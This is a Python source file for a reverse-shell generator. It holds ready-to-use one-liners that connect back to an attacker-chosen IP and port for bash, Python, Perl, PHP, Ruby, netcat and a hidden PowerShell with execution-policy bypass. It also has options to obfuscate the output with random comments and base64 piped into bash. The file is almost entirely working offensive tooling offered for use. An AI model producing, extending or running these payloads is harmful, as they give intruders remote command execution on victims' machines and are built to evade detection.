import logging
import random
import string
import base64
import ipaddress
import shlex

class ReverseShellGenerator:
    """
    Advanced Reverse Shell Generator with multiple templates and improvements:
    1. Multiple templates (bash, cmd, python, perl, php, ruby, powershell, etc.).
    2. IP and port validation (range 1–65535) using the ipaddress library.
    3. Debug mode for detailed logs.
    4. Optional: obfuscation by encoding in Base64.
    5. Polymorphic functionality to insert comments at the end of the command.
    6. Exception handling with clear messages.
    7. Logging with different levels (INFO, DEBUG) based on configuration.
    8. Extendable templates via the add_shell_template() method.

    Quick usage:
        generator = ReverseShellGenerator(debug=True)
        shell_cmd = generator.generate_shell(shell_type="bash", ip="192.168.1.10", port="4444",
                                             encode="base64", polymorphic=True)
        print(shell_cmd)
    """

    def __init__(self, debug: bool = False, log_file: str = "reverse_shell_generator.log"):
        """
        Initializes the Reverse Shell Generator.

        :param debug: Activates more detailed logs if True.
        :param log_file: File where logs will be stored.
        """
        self.debug = debug
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)

        # Console handler
        console_handler = logging.StreamHandler()
        console_formatter = logging.Formatter("[%(levelname)s] %(message)s")
        console_handler.setFormatter(console_formatter)
        self.logger.addHandler(console_handler)

        # File handler
        file_handler = logging.FileHandler(log_file)
        file_formatter = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s",
                                           datefmt='%Y-%m-%d %H:%M:%S')
        file_handler.setFormatter(file_formatter)
        self.logger.addHandler(file_handler)

        # Multiple Reverse Shell templates
        self.shell_templates = {
            "bash": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
            "cmd": (
                "C:\\Windows\\System32\\cmd.exe /k "
                "echo No real interactive shell in CMD, "
                "but redirection and connection can be attempted..."
            ),
            "python": (
                "python -c 'import socket,os,pty; "
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
                "s.connect((\"{IP}\",{PORT})); "
                "os.dup2(s.fileno(),0); "
                "os.dup2(s.fileno(),1); "
                "os.dup2(s.fileno(),2); "
                "pty.spawn(\"/bin/bash\")'"
            ),
            "perl": (
                "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};"
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                "if(connect(S,sockaddr_in($p,inet_aton($i))))"
                "{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ),
            "php": (
                "php -r '$sock=fsockopen(\"{IP}\",{PORT});"
                "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "ruby": (
                "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i; "
                "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            "powershell": (
                "powershell -NoP -NonI -W Hidden -Exec Bypass "
                "-Command \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});"
                "$stream = $client.GetStream();"
                "[byte[]]$bytes = 0..65535|%{0};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                "$sendback = (iex $data 2>&1 | Out-String );"
                "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte, 0, $sendbyte.Length);"
                "$stream.Flush()}"
                "$client.Close()\""
            ),
            "nc": "nc -e /bin/sh {IP} {PORT}",
        }

    def add_shell_template(self, name: str, template: str):
        """
        Adds a new reverse shell template to the dictionary.

        :param name: Name of the template (key).
        :param template: Command with placeholders {IP} and {PORT}.
        :raises ValueError: If the template does not contain the required placeholders.
        """
        self.logger.debug(f"Attempting to add template '{name}'.")
        if "{IP}" not in template or "{PORT}" not in template:
            self.logger.error("The template must contain the placeholders {IP} and {PORT}.")
            raise ValueError("Invalid template: must include {IP} and {PORT}.")

        if name in self.shell_templates:
            self.logger.warning(f"The shell '{name}' already exists and will be overwritten.")

        self.shell_templates[name] = template
        self.logger.info(f"Template '{name}' added successfully.")

    def list_shell_types(self):
        """
        Returns the list of supported reverse shell types.

        :return: Sorted list of shell types.
        """
        return sorted(list(self.shell_templates.keys()))

    def generate_shell(self, shell_type: str, ip: str, port: str,
                       encode: str = "none", polymorphic: bool = False) -> str:
        """
        Generates the reverse shell command according to the selected template,
        with options for encoding and basic polymorphism.

        :param shell_type: Type of shell (e.g., 'bash', 'python', etc.).
        :param ip: IP address or domain where the shell will connect.
        :param port: Port as a string; it will be validated by converting to int.
        :param encode: Encoding mode: 'none', 'base64' (expandable to others).
        :param polymorphic: If True, inserts random comments at the end of the command.
        :return: Final reverse shell command ready to use.
        :raises ValueError: If the shell_type does not exist, invalid port, etc.
        """
        self.logger.debug("Starting shell generation.")

        # Validate shell_type
        if shell_type not in self.shell_templates:
            msg = f"Unrecognized shell type: {shell_type}"
            self.logger.error(msg)
            raise ValueError(msg)

        # Convert and validate the port
        port_int = self._validate_and_convert_port(port)

        # Validate IP using the ipaddress library
        if not self._validate_ip(ip):
            msg = f"Invalid or suspicious IP: {ip}"
            self.logger.warning(msg)
            raise ValueError(msg)

        # Build the base command
        template = self.shell_templates[shell_type]
        try:
            shell_cmd = template.format(IP=shlex.quote(ip), PORT=port_int)
        except KeyError as e:
            self.logger.error(f"Missing placeholder in template: {e}")
            raise ValueError(f"Missing placeholder in template: {e}")

        # If polymorphic, insert random comments at the end of the command
        if polymorphic:
            shell_cmd = self._apply_polymorphism(shell_cmd)

        # Apply encoding if selected
        if encode.lower() == "base64":
            shell_cmd = self._apply_base64_encoding(shell_cmd)
        elif encode.lower() != "none":
            self.logger.warning(f"Encoding '{encode}' not supported. Defaulting to 'none'.")

        self.logger.info("Reverse shell generated successfully.")
        self.logger.debug(f"Generated shell: {shell_cmd}")
        return shell_cmd

    def _validate_and_convert_port(self, port_str: str) -> int:
        """
        Converts the port to an integer and validates that it is in the range 1–65535.

        :param port_str: Port as a string.
        :return: Port as an integer.
        :raises ValueError: If the port is not valid.
        """
        self.logger.debug(f"Validating and converting port: {port_str}")
        try:
            port_num = int(port_str)
            if not (1 <= port_num <= 65535):
                self.logger.error(f"Port out of range: {port_num}")
                raise ValueError("Port must be between 1 and 65535.")
            return port_num
        except ValueError:
            self.logger.error(f"Invalid port: {port_str}")
            raise ValueError("Port must be a valid number between 1 and 65535.")

    def _validate_ip(self, ip_str: str) -> bool:
        """
        Validates an IPv4 address using the ipaddress library.

        :param ip_str: IP address as a string.
        :return: True if the IP is valid, False otherwise.
        """
        self.logger.debug(f"Validating IP: {ip_str}")
        try:
            ipaddress.IPv4Address(ip_str)
            self.logger.debug("Valid IP.")
            return True
        except ipaddress.AddressValueError:
            self.logger.warning("Invalid IP according to ipaddress.")
            return False

    def _apply_polymorphism(self, shell_cmd: str) -> str:
        """
        Inserts a random comment at the end of the command to minimally obfuscate it.

        :param shell_cmd: Original shell command.
        :return: Obfuscated command.
        """
        self.logger.debug("Applying polymorphism to the command.")
        random_comment = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        # Insert the comment at the end of the command
        shell_cmd += f" #_{random_comment}_"
        self.logger.debug("Comment added to the end of the command.")
        return shell_cmd

    def _apply_base64_encoding(self, shell_cmd: str) -> str:
        """
        Encodes the command in Base64 to obfuscate it slightly.

        :param shell_cmd: Original shell command.
        :return: Command encoded in Base64.
        """
        self.logger.debug("Applying Base64 encoding to the command.")
        encoded_bytes = base64.b64encode(shell_cmd.encode("utf-8"))
        encoded_str = encoded_bytes.decode("utf-8")
        # Depending on the shell, the way to decode and execute may vary
        # Here is an example for Bash
        encoded_cmd = f'echo "{encoded_str}" | base64 -d | bash'
        self.logger.debug(f"Command encoded in Base64: {encoded_cmd}")
        return encoded_cmd

    def sanitize_input(self, input_str: str) -> str:
        """
        Sanitizes user input to prevent command injection.

        :param input_str: User input.
        :return: Sanitized input.
        """
        self.logger.debug("Sanitizing user input.")
        return shlex.quote(input_str)
